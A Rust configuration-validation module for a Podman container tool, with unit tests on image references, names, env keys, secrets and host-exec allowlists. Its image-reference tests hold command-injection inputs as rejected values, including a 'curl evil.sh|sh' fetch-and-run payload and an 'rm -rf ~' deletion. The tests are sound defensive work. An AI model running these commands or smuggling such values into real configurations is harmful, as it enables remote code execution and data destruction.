use anyhow::Result;

use crate::config::Config;
use crate::error::PodboxError;

mod caches;
#[cfg(feature = "cli")]
mod host;
#[cfg(feature = "cli")]
mod printing;
mod provision;
mod safety;
mod values;

use values::{MAX_CPUS, is_absolute_path, is_portal_family};
pub use values::{
    is_bare_memory_digits, is_lowercase_image_name, is_valid_env_key, is_valid_image_ref,
    is_valid_memory, parse_duration_secs, parse_idle_timeout_secs, parse_provision_timeout_secs,
    validate_container_name,
};

/// Test-only query over the parse-warning gate.
#[cfg(all(test, feature = "cli"))]
pub(crate) fn note_was_seen(message: &str) -> bool {
    printing::was_noted(message)
}

/// [`printing::set_quiet`], for the command layer.
#[cfg(feature = "cli")]
pub fn set_parse_warnings_quiet(quiet: bool) {
    printing::set_quiet(quiet);
}

/// Current parse-warning quiet state, for save/restore around a scan.
#[cfg(feature = "cli")]
pub fn parse_warnings_quiet() -> bool {
    printing::quiet()
}

/// Print one diagnostic through the once-per-process gate (used by both
/// [`Config::validate`] and the lenient cleanup loader).
#[cfg(feature = "cli")]
pub(crate) fn note_parse_warning(message: impl Into<String>) {
    printing::note(message);
}

impl Config {
    pub fn validate(&self) -> Result<()> {
        let validated = self.validate_with_warnings();
        // The wasm/Studio path uses `validate_with_warnings` directly: the
        // print macros panic on wasm targets, so only the CLI may print.
        #[cfg(feature = "cli")]
        for warning in &validated.0 {
            note_parse_warning(warning.clone());
        }
        validated.1
    }

    /// Validate, collecting non-fatal diagnostics alongside the verdict.
    /// Warnings are produced independently of the error outcome, matching
    /// the CLI (which prints them even when validation fails).
    pub fn validate_with_warnings(&self) -> (Vec<String>, Result<()>) {
        // Reshaping decisions (defaults, migrations) speak through the same
        // warnings channel as validation, so every surface that shows
        // diagnostics shows the notices too.
        let mut warnings: Vec<String> = self.parse_notices.clone();
        let mut errors: Vec<String> = Vec::new();

        if self.image.base.trim().is_empty() {
            errors.push("image.base: must not be empty".into());
        } else if !is_valid_image_ref(&self.image.base) {
            errors.push(format!(
                "image.base: '{}' is not a valid image reference (expected [registry/]name[:tag], no spaces or shell characters)",
                self.image.base
            ));
        }
        if self.image.name.trim().is_empty() {
            errors.push("image.name: must not be empty".into());
        } else if let Err(e) = validate_container_name("image", &self.image.name) {
            errors.push(format!("image.name: {e}"));
        } else if !is_lowercase_image_name(&self.image.name) {
            errors.push(format!(
                "image.name: '{}' must be lowercase (podman rejects uppercase image repository names)",
                self.image.name
            ));
        }
        if let Some(ref r) = self.image.image_ref {
            if r.trim().is_empty() {
                errors.push("image.image: must not be empty when set".into());
            } else if !is_valid_image_ref(r) {
                errors.push(format!(
                    "image.image: '{r}' is not a valid image reference (expected [registry/]name[:tag][@sha256:<digest>], no spaces or shell characters)"
                ));
            }
        }

        if self.container.name.trim().is_empty() {
            errors.push("container.name: must not be empty".into());
        } else if let Err(e) = validate_container_name("container", &self.container.name) {
            errors.push(format!("container.name: {e}"));
        }
        if self.container.home.as_os_str().is_empty() {
            errors.push("container.home: must not be empty".into());
        }
        if self.container.shell.trim().is_empty() {
            errors.push("container.shell: must not be empty".into());
        }
        if self.container.slice.trim().is_empty() || self.container.slice.contains('\n') {
            errors.push("container.slice: must be a non-empty systemd slice name".into());
        }
        if !(1..=10_000).contains(&self.container.cpu_weight) {
            errors.push("container.cpu_weight: must be between 1 and 10000".into());
        }
        if let Some(dotfiles) = &self.dotfiles {
            if dotfiles.source.trim().is_empty() {
                errors.push("dotfiles.source: must not be empty".into());
            } else if dotfiles.source == "host:" {
                errors.push("dotfiles.source: host: must be followed by a directory path".into());
            }
            if dotfiles.target.trim().is_empty() {
                errors.push("dotfiles.target: must not be empty".into());
            } else {
                let target = if dotfiles.target == "~" {
                    ""
                } else {
                    dotfiles
                        .target
                        .strip_prefix("~/")
                        .unwrap_or(&dotfiles.target)
                };
                let path = std::path::Path::new(target);
                if path.is_absolute()
                    || (target.starts_with('~')
                        && dotfiles.target != "~"
                        && !dotfiles.target.starts_with("~/"))
                    || path.components().any(|part| {
                        matches!(
                            part,
                            std::path::Component::ParentDir | std::path::Component::RootDir
                        )
                    })
                {
                    errors.push(
                        "dotfiles.target: must be a path inside the container home (for example '~/.dotfiles')".into(),
                    );
                }
            }
            if dotfiles
                .install
                .as_ref()
                .is_some_and(|cmd| cmd.trim().is_empty())
            {
                errors.push("dotfiles.install: must not be empty when set".into());
            }
        }
        if let Some(ref mem) = self.container.memory {
            if !is_valid_memory(mem) {
                errors.push(format!(
                    "container.memory: '{mem}' is not a valid memory limit (e.g. '2g', '512m')"
                ));
            }
        }
        if let Some(ref cpus) = self.container.cpus {
            // `NaN`/`inf` parse as f64 but are meaningless as CPU counts;
            // without the finiteness check they sailed through to
            // `PodmanArgs=--cpus=NaN`.
            let valid = cpus
                .parse::<f64>()
                .is_ok_and(|v| v.is_finite() && v > 0.0 && v <= MAX_CPUS);
            if !valid {
                errors.push(format!(
                    "container.cpus: '{cpus}' is not a valid CPU count (e.g. '2.0', '0.5')"
                ));
            }
        }
        for (i, mount) in self.container.mounts.extra.iter().enumerate() {
            if !mount.contains(':') {
                errors.push(format!(
                    "container.mounts.extra[{i}]: '{mount}' missing ':' separator (expected host:container[:options])"
                ));
            }
        }
        for (key, val) in &self.container.env.values {
            if !is_valid_env_key(key) {
                errors.push(format!(
                    "container.env: invalid key '{key}' (use ^[A-Za-z_][A-Za-z0-9_]*$)"
                ));
            }
            if key.contains('\n') {
                errors.push(format!("container.env: key {key:?} contains newline"));
            }
            if val.contains('\n') {
                errors.push(format!("container.env: value for {key:?} contains newline"));
            }
        }
        errors.extend(safety::validate_safety(self));
        errors.extend(provision::validate_provision(&self.provision));
        errors.extend(caches::validate_caches(self));
        // Host-fact checks belong to the CLI only: the Studio (wasm) has no
        // host to ask, and every path would read as "missing" there.
        #[cfg(feature = "cli")]
        warnings.extend(host::host_path_warnings(self));
        for (i, pattern) in self.container.env.forward.iter().enumerate() {
            // A trailing `*` marks a prefix forward (`FOO_*`); the key
            // itself must still be a valid env name.
            let key = pattern.strip_suffix('*').unwrap_or(pattern);
            if !is_valid_env_key(key) {
                errors.push(format!(
                    "container.env.forward[{i}]: '{pattern}' must be an environment key or PREFIX_*"
                ));
            }
        }
        for (name, service) in &self.container.services {
            let valid_name = !name.is_empty()
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
            if !valid_name {
                errors.push(format!("container.services: invalid service name '{name}'"));
            }
            let (command, env) = match service {
                crate::config::ServiceConfig::Short(command) => (command, None),
                crate::config::ServiceConfig::Detailed(detail) => {
                    (&detail.command, Some(&detail.env))
                }
            };
            if command.trim().is_empty() {
                errors.push(format!(
                    "container.services.{name}.command: must not be empty"
                ));
            }
            // `restart` is a `ServiceRestart` enum: unknown spellings fail
            // at parse time with the valid list, so there is nothing to
            // re-check here.
            if let Some(values) = env {
                for (key, value) in values {
                    if !is_valid_env_key(key)
                        || value.chars().any(|c| matches!(c, '\0' | '\n' | '\r'))
                    {
                        errors.push(format!(
                            "container.services.{name}.env: invalid environment entry '{key}'"
                        ));
                    }
                }
            }
        }

        // `security.userns` is a `UsernsMode` enum: unknown spellings fail
        // at parse time with the valid list, so there is nothing to
        // re-check here.

        // Network validation. `network.mode` is a `NetworkMode` enum:
        // unknown spellings fail at parse time with the valid list.
        if self.network.effective_mode() == crate::config::NetworkMode::None
            && !self.network.ports.is_empty()
        {
            errors.push(
                "network.ports: cannot publish ports when network mode is none/offline".into(),
            );
        }

        if self.integration.x11 && !self.integration.wayland {
            errors.push(
                "integration.x11: x11 needs wayland (the satellite is a Wayland client)".into(),
            );
        }
        if self.integration.x11 && self.network.effective_mode() == crate::config::NetworkMode::Host
        {
            errors.push(
                "integration.x11: x11 cannot use network.mode = \"host\" because DISPLAY=:0 could reach the host X server's abstract socket".into(),
            );
        }

        for (i, port) in self.network.ports.iter().enumerate() {
            if !port.contains(':') {
                errors.push(format!(
                    "network.ports[{i}]: '{port}' is invalid (expected 'hostPort:containerPort' or 'ip:hostPort:containerPort')"
                ));
            }
        }

        if let Some(ref map) = self.integration.host_exec.allowlist {
            for (alias, entry) in map {
                let path = entry.path();
                if !is_absolute_path(path) {
                    errors.push(format!(
                        "integration.host_exec.allowlist.{alias}: path '{path}' is not absolute (must start with '/')"
                    ));
                }
                if let Some(secs) = entry.timeout_secs() {
                    if secs < 1 {
                        errors.push(format!(
                            "integration.host_exec.allowlist.{alias}: timeout = {secs} is invalid \
                             (allowed: whole seconds >= 1; omit the key for no timeout)"
                        ));
                    }
                }
                if alias.is_empty()
                    || alias.contains('/')
                    || alias.contains("..")
                    || alias.contains('\0')
                {
                    errors.push(format!(
                        "integration.host_exec.allowlist: alias '{alias}' is invalid (must not contain '/' or '..')"
                    ));
                }
                const RESERVED: &[&str] = &[
                    "podbox-guest",
                    "podmgr-guest",
                    "host-exec",
                    "notify-send",
                    "xdg-open",
                    "podbox-clipboard",
                    "podmgr-clipboard",
                ];
                if RESERVED.contains(&alias.as_str()) {
                    errors.push(format!(
                        "integration.host_exec.allowlist: alias '{alias}' is reserved"
                    ));
                }
            }
        }

        // systemd-credential secrets become LoadCredential= names and
        // /run/secrets/<name> file names: reject path separators and
        // parent references, require the host-side path, and require a
        // valid variable name when the target becomes Environment=KEY=….
        for (i, entry) in self.security.secrets.iter().enumerate() {
            let (name, secret_type, target, source, path) = match entry {
                crate::config::SecretEntry::Simple(name) => (
                    name,
                    &crate::config::SecretType::Env,
                    None,
                    &crate::config::SecretSource::Podman,
                    None,
                ),
                crate::config::SecretEntry::Detailed {
                    name,
                    secret_type,
                    target,
                    source,
                    path,
                    ..
                } => (name, secret_type, target.as_ref(), source, path.as_ref()),
            };
            let prefix = format!("security.secrets[{i}]");
            if name.is_empty()
                || name.contains('/')
                || name.contains('\\')
                || name.split('/').any(|part| part == "..")
            {
                errors.push(format!(
                    "{prefix}.name: '{name}' is not a safe credential filename (no '/', '\\\\' or '..')"
                ));
            }
            if *source == crate::config::SecretSource::Systemd {
                match path {
                    Some(p) if !p.trim().is_empty() => {}
                    _ => errors.push(format!(
                        "{prefix}.path: required with source = \"systemd\" (host-side credential file)"
                    )),
                }
                if *secret_type == crate::config::SecretType::Env
                    && let Some(t) = target
                    && !is_valid_env_key(t)
                {
                    errors.push(format!(
                        "{prefix}.target: '{t}' must be a valid environment variable name"
                    ));
                }
            }
        }

        // Packages need a package manager: an undetectable image family
        // with install entries would otherwise silently emit the wrong
        // install command (dnf on Arch). Fail with the fix attached.
        if !self.image.packages.install.is_empty()
            && crate::codegen::distros::family_for_config(self)
                == crate::codegen::distros::DistroFamily::Unknown
        {
            let image = self.image.image_ref.as_deref().unwrap_or(&self.image.base);
            errors.push(format!(
                "image.packages: cannot determine package manager for '{image}'; set image.packages.manager explicitly (\"apt\", \"dnf\", \"pacman\", \"apk\" or \"zypper\")"
            ));
        }

        // `lifecycle.on_stop` is deprecated: Quadlet runs containers with
        // `--rm --replace`, so every box is ephemeral and there is nothing to
        // keep. Warn when set explicitly, but keep parsing it.
        if self.explicit_keys.contains("lifecycle.on_stop") {
            warnings.push(
                "warning: lifecycle.on_stop is deprecated and has no effect: Quadlet containers \
                 are always ephemeral; state lives in the home volume and snapshots."
                    .into(),
            );
        }

        if self.integration.host_exec.enabled {
            let has_allowlist = self
                .integration
                .host_exec
                .allowlist
                .as_ref()
                .is_some_and(|m| !m.is_empty());
            if !has_allowlist {
                errors.push(
                    "integration.host_exec: 'enabled' is true, but 'allowlist' is missing or empty. \
                     For security, legacy open execution is blocked; you must explicitly define \
                     allowed host commands."
                        .into(),
                );
            }
        }

        for svc in &self.dbus.talk {
            if is_portal_family(svc) {
                warnings.push(format!(
                    "warning: dbus.talk entry '{svc}' grants the container access to the full \
                     xdg-desktop-portal bus surface (DynamicLauncher, Screenshot, ScreenCast, \
                     Settings, ...). Prefer relying on the built-in interface-scoped portal rules \
                     from integration.notify / integration.xdg_open instead."
                ));
            }
        }

        // The scheme allowlist is security-relevant input: a typo like
        // "HTTPS" would be parsed as a (never-matching) scheme and silently
        // refuse exactly the traffic the user meant to allow. Refuse it here
        // instead, while the definition file is still open for editing.
        for (i, scheme) in self.integration.xdg_open.allowed_schemes.iter().enumerate() {
            if !crate::config::types::is_scheme_token(scheme) {
                errors.push(format!(
                    "integration.xdg_open.allowed_schemes[{i}]: '{scheme}' is not a valid \
                     scheme name (lowercase letters, digits, '-', '+' or '.', starting with a letter)"
                ));
            }
        }

        // D-Bus rules without the bus itself are dead config: with
        // `integration.dbus` off the container gets no D-Bus at all, so talk,
        // own, or a preset would be silently ignored. Fail fast instead.
        if !self.integration.dbus
            && (!self.dbus.talk.is_empty()
                || !self.dbus.own.is_empty()
                || self.dbus.preset != crate::config::DbusPreset::None)
        {
            errors.push(
                "dbus: talk/own/preset rules are set but 'integration.dbus' is false, \
                 so the container would get no D-Bus at all. Set 'integration.dbus = true' \
                 to apply them."
                    .into(),
            );
        }

        let t = &self.lifecycle.idle_timeout;
        if t != "off" {
            if let Err(e) = parse_duration_secs(t) {
                errors.push(format!(
                    "lifecycle.idle_timeout: '{t}' is invalid ({e}; expected 'off', '30s', '5m', '1h')"
                ));
            }
        }
        if let Err(e) = parse_duration_secs(&self.image.pull_retry_delay) {
            errors.push(format!(
                "image.pull_retry_delay: '{}' is invalid ({e}; expected e.g. '5s')",
                self.image.pull_retry_delay
            ));
        }

        if errors.is_empty() {
            (warnings, Ok(()))
        } else {
            (
                warnings,
                Err(PodboxError::ConfigValidationFailed {
                    details: errors.join("\n  - "),
                }
                .into()),
            )
        }
    }
}

#[cfg(test)]
mod name_tests {
    use super::{is_lowercase_image_name, validate_container_name};

    #[test]
    fn image_names_must_be_lowercase() {
        assert!(is_lowercase_image_name("dev-box_2"));
        assert!(!is_lowercase_image_name("Dev"));
        // Container names may keep their case.
        assert!(validate_container_name("container", "Dev").is_ok());
    }

    #[test]
    fn rejects_names_unsafe_as_paths_or_flags() {
        for bad in [
            ".",
            "..",
            "-x",
            "a/b",
            "",
            "a b",
            ".hidden",
            "a\0b",
            "tab\tname",
        ] {
            assert!(
                validate_container_name("container", bad).is_err(),
                "should reject {bad:?}"
            );
        }
    }

    #[test]
    fn accepts_ordinary_names() {
        for good in ["dev", "my-box_2", "a.b", "a..b", "Work", "9lives"] {
            assert!(
                validate_container_name("container", good).is_ok(),
                "should accept {good:?}"
            );
        }
    }

    #[test]
    fn enforces_length_limit() {
        assert!(validate_container_name("container", &"a".repeat(63)).is_ok());
        assert!(validate_container_name("container", &"a".repeat(64)).is_err());
    }
}

#[cfg(test)]
mod numeric_duration_tests {
    use super::parse_duration_secs;
    use crate::config::Config;

    fn minimal(image_extra: &str, container_extra: &str, tail: &str) -> String {
        format!(
            "[image]\nbase = \"fedora:41\"\nname = \"env\"\n{image_extra}\
             [container]\nname = \"env\"\nhome = \"~/env\"\n{container_extra}\
             {tail}\n"
        )
    }

    #[test]
    fn valid_durations_parse() {
        assert_eq!(parse_duration_secs("90s").unwrap(), 90);
        assert_eq!(parse_duration_secs("5m").unwrap(), 300);
        assert_eq!(parse_duration_secs("1h").unwrap(), 3600);
        assert_eq!(parse_duration_secs(" 10s ").unwrap(), 10);
    }

    #[test]
    fn trailing_junk_and_empty_are_rejected() {
        for bad in ["5mx", "m5", "", "off", "5", "0s", "500ms", "-5s"] {
            assert!(parse_duration_secs(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn non_finite_and_non_positive_cpus_are_rejected() {
        for bad in ["NaN", "inf", "-inf", "-1", "0", "0.0", "999999"] {
            let err = Config::parse(&minimal("", &format!("cpus = \"{bad}\"\n"), ""))
                .expect_err(&format!("cpus = {bad:?} must fail validation"));
            assert!(
                err.to_string().contains("container.cpus"),
                "error should name the field: {err}"
            );
        }
    }

    #[test]
    fn ordinary_cpus_are_accepted() {
        for good in ["2.0", "0.5", "16"] {
            Config::parse(&minimal("", &format!("cpus = \"{good}\"\n"), ""))
                .unwrap_or_else(|_| panic!("cpus = {good:?} should validate"));
        }
    }

    #[test]
    fn idle_timeout_with_trailing_junk_is_rejected() {
        let err = Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5mx\"\n"))
            .expect_err("idle_timeout with trailing junk must fail");
        assert!(err.to_string().contains("lifecycle.idle_timeout"), "{err}");
        Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5m\"\n"))
            .expect("a plain duration should validate");
    }

    #[test]
    fn pull_retry_delay_is_duration_checked() {
        let err = Config::parse(&minimal("pull_retry_delay = \"5x\"\n", "", ""))
            .expect_err("pull_retry_delay with bad suffix must fail");
        assert!(err.to_string().contains("image.pull_retry_delay"), "{err}");
    }
}

#[cfg(test)]
mod env_key_tests {
    use super::is_valid_env_key;
    use crate::config::Config;

    /// Host-path warnings fire on missing paths, and never turn into
    /// errors: a portable definition must still validate on a host that
    /// lacks the binary or directory.
    #[test]
    fn missing_host_paths_warn_without_failing() {
        let cfg = Config::parse(
            &(base()
                + "[integration.host_exec]\nenabled = true\n\
                  [integration.host_exec.allowlist]\n\
                  ghost = \"/nonexistent/bin/ghost\"\n\
                  [[storage.host_caches.custom]]\n\
                  name = \"zap\"\nhost_path = \"/nonexistent/zap\"\ncontainer_path = \"~/.cache/zap\"\n\
                  [dotfiles]\nsource = \"host:/nonexistent/dots\"\n"),
        )
        .unwrap();
        let (warnings, verdict) = cfg.validate_with_warnings();
        assert!(
            verdict.is_ok(),
            "host facts must not fail validation: {verdict:?}"
        );
        assert!(
            warnings
                .iter()
                .any(|w| w.contains("ghost") && w.contains("/nonexistent/bin/ghost")),
            "{warnings:?}"
        );
        assert!(
            warnings
                .iter()
                .any(|w| w.contains("storage.host_caches.custom.zap")),
            "{warnings:?}"
        );
        assert!(
            warnings.iter().any(|w| w.contains("dotfiles.source")),
            "{warnings:?}"
        );
    }

    /// Paths that do exist stay silent: the common case must not nag.
    #[test]
    fn present_host_paths_are_silent() {
        let cfg = Config::parse(
            &(base()
                + "[integration.host_exec]\nenabled = true\n\
                  [integration.host_exec.allowlist]\n\
                  sh = \"/bin/sh\"\n"),
        )
        .unwrap();
        let (warnings, _) = cfg.validate_with_warnings();
        assert!(
            !warnings.iter().any(|w| w.contains("host_exec")),
            "an existing binary must not warn: {warnings:?}"
        );
    }

    fn base() -> String {
        "[image]\nbase = \"fedora:41\"\nname = \"env\"\n\
         [container]\nname = \"env\"\nhome = \"~/env\"\n"
            .to_string()
    }

    #[test]
    fn key_grammar() {
        for bad in ["1ABC", "A-B", "Ä", "", "A B", "A=B"] {
            assert!(!is_valid_env_key(bad), "should reject {bad:?}");
        }
        for good in ["_A1", "PATH", "_", "A1_b2"] {
            assert!(is_valid_env_key(good), "should accept {good:?}");
        }
    }

    #[test]
    fn container_env_values_are_checked() {
        let err = Config::parse(&(base() + "[container.env]\n1ABC = \"x\"\n"))
            .expect_err("bad container.env key must fail");
        assert!(err.to_string().contains("container.env"), "{err}");
    }

    #[test]
    fn container_env_forward_patterns_are_checked() {
        let err = Config::parse(&(base() + "[container.env]\nforward = [\"1ABC\"]\n"))
            .expect_err("bad forward pattern must fail");
        assert!(err.to_string().contains("container.env.forward"), "{err}");
        Config::parse(&(base() + "[container.env]\nforward = [\"FOO_*\"]\n"))
            .expect("PREFIX_* forwards should validate");
    }

    #[test]
    fn service_env_is_checked() {
        let err = Config::parse(
            &(base()
                + "[container.services.web]\ncommand = \"x\"\n[container.services.web.env]\nA-B = \"x\"\n"),
        )
        .expect_err("bad service env key must fail");
        assert!(
            err.to_string().contains("container.services.web.env"),
            "{err}"
        );
    }

    #[test]
    fn provision_env_is_checked() {
        let err = Config::parse(
            &(base() + "[[provision]]\nname = \"step\"\nrun = \"echo\"\n[provision.env]\n\"Ä\" = \"x\"\n"),
        )
        .expect_err("bad provision env key must fail");
        assert!(err.to_string().contains("provision[0].env"), "{err}");
    }

    #[test]
    fn systemd_secret_targets_are_checked() {
        let err = Config::parse(
            &(base()
                + "[[security.secrets]]\nname = \"tok\"\nsource = \"systemd\"\npath = \"/run/x\"\ntype = \"env\"\ntarget = \"1ABC\"\n"),
        )
        .expect_err("bad secret target must fail");
        assert!(
            err.to_string().contains("security.secrets[0].target"),
            "{err}"
        );
    }
}

#[cfg(test)]
mod image_ref_tests {
    use super::is_valid_image_ref;
    use crate::config::Config;

    #[test]
    fn valid_refs_are_accepted() {
        for good in [
            "fedora:41",
            "fedora",
            "dev-latest",
            "ubuntu:22.04",
            "ghcr.io/bethropolis/podbox:dev-latest",
            "ghcr.io/a/b:1",
            "localhost:5000/mybox:latest",
            "docker.io/library/archlinux:latest",
            "alpine:3.20",
            "myrepo/myimage@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "ghcr.io/a/b:1@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
        ] {
            assert!(is_valid_image_ref(good), "should accept {good:?}");
        }
    }

    #[test]
    fn shell_characters_and_malformed_refs_are_rejected() {
        for bad in [
            "",
            " ",
            "ghcr.io/a/b:1 --name x; curl evil.sh|sh #",
            "a;rm -rf ~",
            "$(evil)",
            "`evil`",
            "a'b",
            "a\"b",
            "a/b\\c",
            "UPPER/repo:tag",
            "a//b",
            "/a",
            "a/",
            ":tag",
            "a:",
            "-bad/x",
            "a:b:c",
            "a@sha256:xyz",
            "a@md5:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "a..b/c",
        ] {
            assert!(!is_valid_image_ref(bad), "should reject {bad:?}");
        }
    }

    #[test]
    fn crafted_share_link_ref_fails_validation() {
        let toml = "[image]\nbase = \"fedora:41\"\nname = \"env\"\nimage = \"ghcr.io/a/b:1 --name x; curl evil.sh|sh #\"\n[container]\nname = \"env\"\nhome = \"~/env\"\n";
        let err = Config::parse(toml).expect_err("crafted ref must fail validation");
        assert!(err.to_string().contains("image.image"), "{err}");
    }
}
